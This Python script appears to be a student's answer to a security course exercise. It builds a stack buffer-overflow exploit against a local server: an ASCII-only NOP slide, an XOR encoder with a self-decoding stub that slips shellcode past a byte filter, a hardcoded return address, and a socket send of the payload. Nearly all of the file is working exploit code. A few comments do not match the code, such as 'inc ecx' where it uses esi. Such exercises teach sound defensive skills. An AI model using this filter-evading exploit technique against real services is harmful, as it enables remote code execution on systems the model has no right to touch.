#!/usr/bin/python

import os, socket, struct
import q2, assemble


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337

TOTAL_SIZE = 1040
ASCII_MAX = 0x7f

def get_nop_slide(number_of_nops):
    #creating the "nop" slide made of inc ecx & dec ecx
	data = 'inc esi\ndec esi\n' * (number_of_nops/2) 
	if(number_of_nops%2 != 0):
        #if the length of the nop slide is odd add one mroe inc ecx
		data = data + 'inc esi\n' 
	nop_slide = assemble.assemble_data(data)
	return nop_slide


def encoder(shellcode, length):
    encoded_shellcode = ''
    pos = list()
    offset = 0
    for c in shellcode:
        if(ord(c) > ASCII_MAX):
        	encoded_shellcode = encoded_shellcode + chr(ord(c)^0xff)
        	pos.append(offset)
        	offset = 1 
        else:
        	offset += 1
        	encoded_shellcode = encoded_shellcode + c
    return encoded_shellcode, pos

def get_decoder(length, pos):
	# push esp
    # pop eax ;eax now holds the end address of the encoded shellcode
	# dec eax ;|shellcode| + 4 times
	# push 0
    # pop ebx
    # dec ebx 
    # inc eax ;pos[i] times where i is the ith encoded byte
    # xor byte ptr [eax], bl ; repeat |shellcode| times
	data = 'push esp\npop eax\n' + 'dec eax\n' * 4 + 'push 0\npop ebx\ndec ebx\n' + 'dec eax\n' * length
	for i in range(len(pos)):
		data = data + 'inc eax\n' * (pos[i]) + 'xor byte ptr [eax], bl\n'
	decoder = assemble.assemble_data(data)
	return decoder

def get_raw_shellcode():
    return q2.get_shellcode()


def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.
    
    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''
    shellcode = get_raw_shellcode()

    # encode the shellcode
    encoded_shellcode, pos = encoder(shellcode, len(shellcode)) 

    # create a decoder for the encoded shellcode
    decoder = get_decoder(len(encoded_shellcode), pos);

    return decoder + encoded_shellcode

    # NOTES:
    # 1. Don't delete this function - we are going to test it directly.
    # 2. You should use the shellcode you implemented in the previous question,
    #    by calling `get_raw_shellcode()`


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''

    #Size of the payload not including the first 4 bytes
    TOTAL_SIZE = 1040 
    shellcode = get_shellcode()

    # Calculate the size of the nop slide
    number_of_nops = TOTAL_SIZE - len (shellcode)

    # Calculate the return address so that we will land in the middle of nop slide
    ra = 0xbfffddcc + int(number_of_nops/2) 

    # Generate the pseudo NOP slide
    nop_slide = get_nop_slide(number_of_nops)

    # All together now!
    payload = nop_slide + shellcode + str(struct.pack('<L', ra))
    return str(struct.pack('>L', len(payload))) + payload

    # NOTE:
    # Don't delete this function - we are going to test it directly in our
    # tests, without running the main() function below.


def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
